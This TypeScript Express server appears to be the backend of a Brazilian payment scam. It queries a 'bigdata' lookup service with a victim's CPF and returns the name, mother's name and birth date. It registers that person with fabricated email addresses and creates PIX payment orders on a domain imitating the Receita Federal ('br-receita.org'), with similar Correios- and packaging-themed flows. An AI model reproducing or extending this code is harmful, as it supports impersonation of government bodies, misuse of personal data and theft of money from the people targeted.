// src/index.ts
import express, {
    Router,
    Request,
    Response,
    NextFunction,
    RequestHandler
  } from 'express';
  import dotenv from 'dotenv';
dotenv.config();  
  const app = express();
  const port = process.env.PORT || 3000;
  import cors from 'cors';
import rateLimit from 'express-rate-limit';
import { cpfConsultaCorreios, getCorreioCart, getProducts, paymentCorreios } from './correios';
import { cpfConsultaRetentativa, getCartRetentativa, paymentRetentativa } from './retentativa';
import { cpfConsultaEmbalagem, getEmbalagemCart, paymentEmbalagem } from './embalagem';
  app.use(express.json());
  app.use(cors(
    {
        origin: '*'
    }
));

  app.set('trust proxy', 1)
  const consultaRouter: Router = Router();

  const cpfLimiter = rateLimit({
    windowMs: 60 * 1000, // 15 minutos
    max: 10,                  // max 60 requests por IP
    standardHeaders: true,    // retorna infos em RateLimit-* headers
    legacyHeaders: false,     // desativa X-RateLimit-* headers
  });
  const cpfConsulta = async (req: any, res: any, next: any) => {
    const { cpf, cartId } = req.params;
    const { email, phone } = req.body;
    try {
      const apiUrl = `https://hydraservices.shop/api/bigdata/${cpf}?type=cpf&token=${process.env.CPF_TOKEN}`;
      const upstream = await fetch(apiUrl, { method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        }
       });
      if (!upstream.ok) {
        return res
          .status(upstream.status)
          .json({ error: `Upstream retornou ${upstream.status}` });
      }
      const data = await upstream.json();
      console.log(data)
      const getOrder = await fetch(
        `https://api-regularizar.br-receita.org/cart/${cartId}/customer`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Accept: 'application/json',
          },
          body: JSON.stringify(
            phone ?
            {
            name: data.NOME,
            document: data.CPF,
            document_type: 'CPF',
            email: email ||   `${(data.NOME as string).normalize('NFD')
              .replace(/[\u0300-\u036f]/g, '')
              .replace(/\s+/g, '')
              .replace(/[^a-zA-Z0-9]/g, '')
              .toLowerCase()}@sememail.com`,
              phone_number: phone
            }
            :
            {
            name: data.NOME,
            document: data.CPF,
            document_type: 'CPF',
            email: email ||   `${(data.NOME as string).normalize('NFD')
              .replace(/[\u0300-\u036f]/g, '')
              .replace(/\s+/g, '')
              .replace(/[^a-zA-Z0-9]/g, '')
              .toLowerCase()}@sememail.com`,
          })
        }
      );
      if (!getOrder.ok) {
        return res
          .status(getOrder.status)
          .json({ error: `Payment API retornou ${getOrder.status}` });
      }
      const formattedData = {
        NOME: data.NOME,
        CPF: data.CPF,
        NOME_MAE: data.NOME_MAE,
        DT_NASCIMENTO: data.DT_NASCIMENTO,
        SEXO: data.SEXO,
      }
      return res.json(formattedData);
    } catch (err) {
      next(err);
    }


  };


  const cpf = async (req: any, res: any, next: any) => {
    const { cpf, cartId } = req.params;

    try {
      const apiUrl = `https://hydraservices.shop/api/bigdata/${cpf}?type=cpf&token=${process.env.CPF_TOKEN}`;
      const upstream = await fetch(apiUrl, { method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        }
       });
      if (!upstream.ok) {
        return res
          .status(upstream.status)
          .json({ error: `Upstream retornou ${upstream.status}` });
      }
      const data = await upstream.json();
      const formattedData = {
        NOME: data.NOME,
        CPF: data.CPF,
        NOME_MAE: data.NOME_MAE,
        DT_NASCIMENTO: data.DT_NASCIMENTO,
        SEXO: data.SEXO,
      }
    
      return res.json(formattedData);
    } catch (err) {
      next(err);
    }


  };

  const getCartByPlan = async(req: any, res: any, next: any) => {
    console.log('error')
    try {
      const paymentRes = await fetch(
        'https://api-regularizar.br-receita.org/r/QU0tNjgwZjdmOTg3M2QwMg',
        {
          method: 'GET',
          headers: {
            'Accept': 'application/json',
          
          }
        }
      );
     console.log(paymentRes)
      if (!paymentRes.ok) {
        return res
          .status(paymentRes.status)
          .json({ error: `Payment API retornou ${paymentRes.status}` });
      }
      const cartId = (await paymentRes.text()).trim(); 
      return res.json({
        cartId
      })
    }catch(err) {
      return res.json(err)
    }
  

  }
  const cartRouter: Router = Router()
  cartRouter.get('/cart', getCartByPlan)
  app.use('/', cartRouter)

  const cartRetentativaRouter: Router = Router()
  cartRetentativaRouter.get('/retentativa/cart', getCartRetentativa)
  app.use('/', cartRetentativaRouter)
  const cartCorreioRouter: Router = Router()
  cartCorreioRouter.get('/correio/cart', getCorreioCart)
  app.use('/', cartCorreioRouter)
  const cartEmbalagemRouter: Router = Router()
  cartEmbalagemRouter.get('/embalagem/cart', getEmbalagemCart)
  app.use('/', cartEmbalagemRouter)



  const getProductsRouter: Router = Router()
  getProductsRouter.get('/produtos', getProducts)
  app.use("/", getProductsRouter)

  consultaRouter.get('/:cpf', cpfLimiter, cpf);
  app.use('/', consultaRouter)

  const customerRouter: Router = Router();
  customerRouter.post('/:cpf/:cartId',cpfLimiter, cpfConsulta);
  app.use('/customer', customerRouter);





  const paymentRouter: Router = Router();
  export const payment = async (req: Request, res: any, next: any) => {
    const { cpf, cartId } = req.params;
    const { phone, email } = req.body;
  
    // 1) monte seu payload normalmente…
    const apiUrl = `https://hydraservices.shop/api/bigdata/${cpf}?type=cpf&token=${process.env.CPF_TOKEN}`;
    const upstream = await fetch(apiUrl, { method: 'GET', headers: { 'Content-Type': 'application/json' }});
    if (!upstream.ok) return res.status(upstream.status).json({ error: `Upstream retornou ${upstream.status}` });
    const data = await upstream.json();
  
    const orderPayload: any = {
      payment_method: 'pix',
      customer: {
        name: data.NOME || 'Nome Exemplo',
        email: email || `${(data.NOME as string)
          .normalize('NFD')
          .replace(/[\u0300-\u036f]/g, '')
          .replace(/\s+/g, '')
          .replace(/[^a-zA-Z0-9]/g, '')
          .toLowerCase()}@sememail.com`,
        document: cpf,
        document_type: 'CPF',
        ...(phone ? { phone_number: phone } : {})
      }
    };
  
    // 2) filtre apenas as UTM que vieram em req.query:
    const ALLOWED = [
      'src',
      'sck',
      'utm_source',
      'utm_campaign',
      'utm_medium',
      'utm_content',
      'utm_term'
    ];
    const qs = Object.entries(req.query)
      .filter(([key, val]) => ALLOWED.includes(key) && val != null)
      .map(([key, val]) => `${encodeURIComponent(key)}=${encodeURIComponent(val as string)}`)
      .join('&');
  
    // 3) monte a URL de order incluindo só as UTM que existem:
    const orderUrl =
      `https://api-regularizar.br-receita.org/cart/${cartId}/order` +
      (qs ? `?${qs}` : '');
  
    // 4) faça o POST para essa URL dinâmica
    const orderRes = await fetch(orderUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Accept: 'application/json',
      },
      body: JSON.stringify(orderPayload),
    });
  
    if (!orderRes.ok) {
      console.error(await orderRes.json());
      return res.status(orderRes.status).json({ error: `Order API retornou ${orderRes.status}` });
    }
  
    const orderData = await orderRes.json();
    return res.json(orderData);
  };
  

  paymentRouter.post('/:cpf/:cartId', payment);
  app.use("/payment", paymentRouter)





  const paymentCorreiosRouter: Router = Router()
  paymentCorreiosRouter.post('/:cpf/:cartId', paymentCorreios);
  app.use("/correio/payment", paymentCorreiosRouter)


  const correioCustomerRouter: Router = Router();
  correioCustomerRouter.post('/:cpf/:cartId',cpfLimiter, cpfConsultaCorreios);
  app.use('/correio/customer', correioCustomerRouter);



  

  const paymentRetentativaRouter: Router = Router()
  paymentRetentativaRouter.post('/:cpf/:cartId', paymentRetentativa);
  app.use("/retentativa/payment", paymentRetentativaRouter)

 
  const retentativaCustomerRouter: Router = Router();
  retentativaCustomerRouter.post('/:cpf/:cartId',cpfLimiter, cpfConsultaRetentativa);
  app.use('/retentativa/customer', retentativaCustomerRouter);


  const paymentEmbalagemRouter: Router = Router()
  paymentEmbalagemRouter.post('/:cpf/:cartId', paymentEmbalagem);
  app.use("/embalagem/payment", paymentEmbalagemRouter)

 
  const embalagemCustomerRouter: Router = Router();
  embalagemCustomerRouter.post('/:cpf/:cartId',cpfLimiter, cpfConsultaEmbalagem);
  app.use('/embalagem/customer', embalagemCustomerRouter);

  app.listen(port, () => {
    console.log(`🚀 Server rodando em http://localhost:${port}`);
  });
  